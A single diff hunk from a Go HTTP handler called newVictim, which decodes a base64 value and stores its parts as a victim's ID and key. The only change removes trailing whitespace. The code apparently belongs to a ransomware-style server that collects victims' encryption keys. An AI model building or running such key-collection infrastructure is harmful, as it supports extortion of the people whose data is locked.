@@ -37,7 +37,7 @@ func newVictim(w http.ResponseWriter, r *http.Request) {
 	infoD, _ := base64.RawStdEncoding.DecodeString(info)
 	info = string(infoD)
 	sections := strings.Split(info, ":")
-	id := sections[0]	
+	id := sections[0]
 	key := sections[1]
 	victim.UniqueID = id
 	victim.Key = key
